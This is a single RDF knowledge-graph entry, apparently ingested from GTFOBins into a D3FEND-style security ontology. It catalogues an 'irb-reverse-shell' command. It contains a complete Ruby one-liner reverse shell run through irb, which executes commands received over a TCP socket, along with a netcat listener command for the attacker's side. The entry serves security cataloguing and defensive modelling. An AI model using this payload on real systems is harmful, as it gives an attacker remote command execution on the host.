mknd:command_irb-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "irb-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_irb ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_irb ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
""" .

